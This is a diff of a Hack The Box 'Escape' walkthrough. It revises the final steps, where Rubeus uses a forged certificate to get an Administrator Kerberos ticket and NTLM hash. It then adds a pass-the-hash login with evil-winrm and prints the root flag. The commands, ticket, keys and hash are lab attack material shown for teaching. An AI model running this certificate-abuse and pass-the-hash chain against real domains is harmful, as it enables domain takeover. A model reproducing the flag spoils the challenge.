@@ -631,7 +631,7 @@ Certify completed in 00:00:13.8002863
 
 As the blog says, we will need to convert the cert.pem file to a pfx file
 
-I saved the cert file in my linux then used openssl to do that, it asks for password to use and i used `lol`
+I saved the cert file in my linux then used openssl to do that, it asks for password but i didn't give it any value
 
 ```
 └─$ nano cert.pem
@@ -675,7 +675,7 @@ Info: Upload successful!
 So now i'll request ticket granting ticket (TGT) with the certificate using rubeus
 
 ```
-PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
 
    ______        _
   (_____ \      | |
@@ -690,49 +690,49 @@ PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:Administrator /cert
 
 [*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
 [*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
-[*] Using domain controller: fe80::452e:63e3:bd46:a3bc%4:88
+[*] Using domain controller: fe80::8034:5f30:f5d7:363d%4:88
 [+] TGT request successful!
 [*] base64(ticket.kirbi):
 
       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
-      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
+      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
 
   ServiceName              :  krbtgt/sequel.htb
   ServiceRealm             :  SEQUEL.HTB
   UserName                 :  Administrator
   UserRealm                :  SEQUEL.HTB
-  StartTime                :  2/26/2023 6:20:08 AM
-  EndTime                  :  2/26/2023 4:20:08 PM
-  RenewTill                :  3/5/2023 6:20:08 AM
+  StartTime                :  2/26/2023 9:43:55 PM
+  EndTime                  :  2/27/2023 7:43:55 AM
+  RenewTill                :  3/5/2023 9:43:55 PM
   Flags                    :  name_canonicalize, pre_authent, initial, renewable
   KeyType                  :  rc4_hmac
-  Base64(key)              :  GMvvK34TbmxNnGb/toMqOw==
-  ASREP (key)              :  2DD339EE74BA5CC0895DB9EBDE8F9A31
+  Base64(key)              :  aTK3h8tobIlJdhLWD+3ftw==
+  ASREP (key)              :  324ED1C236A77EBFD3D4AFBECBAE4E10
 
 [*] Getting credentials using U2U
 
@@ -742,6 +742,43 @@ PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:Administrator /cert
     CredentialData       :
       CredentialCount    : 1
        NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
-
-PS C:\Users\Ryan.Cooper\Documents>
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
 ```
+
+We have the admin ntlm hash `A52F78E4C751E5F5E17E1E9F3E58F4EE` 
+
+I can now perform pass the hash attack over winrm and login as admin
+
+```
+└─$ evil-winrm -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE -i sequel.htb
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
+*Evil-WinRM* PS C:\Users\Administrator\desktop> dir
+
+
+    Directory: C:\Users\Administrator\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        2/26/2023   3:07 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\desktop> more root.txt
+257e1e490a77c9f6762861da48b0930b
+
+*Evil-WinRM* PS C:\Users\Administrator\desktop> 
+```
+
+And we're done 
+
+<br> <br>
+[Back To Home](../../index.md)
